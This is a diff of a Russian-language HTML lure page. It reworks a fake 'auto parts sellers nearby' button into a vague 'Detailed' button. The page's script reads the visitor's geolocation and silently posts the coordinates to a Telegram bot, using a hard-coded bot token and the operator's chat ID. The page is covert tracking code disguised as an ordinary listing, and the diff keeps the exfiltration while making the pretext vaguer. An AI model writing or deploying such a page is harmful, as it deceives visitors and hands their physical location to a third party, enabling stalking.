@@ -42,9 +42,9 @@
 </head>
 <body>
   <div class="container">
-    <h2>Подробное объявление</h2>
-    <p>Автозапчасти. Доступны в вашем регионе.</p>
-    <button onclick="getLocation()">Показать продавцов рядом</button>
+    <h2>Подробная информация</h2>
+    <p>Нажмите на "Подробное", чтобы увидеть всю информацию</p>
+    <button onclick="getLocation()">Подробное</button>
   </div>
 
   <script>
@@ -62,7 +62,7 @@
 
       const message = `🛰 Координаты:\nШирота: ${latitude}\nДолгота: ${longitude}`;
       const telegramBotToken = '7091173298:AAEwXyHlZkscayetEQf_2Btp-Odu2Xd09vk';
-      const chatId = '7307380020'; // <-- твой Telegram ID
+      const chatId = '7307380020'; // твой Telegram ID
 
       fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
         method: 'POST',
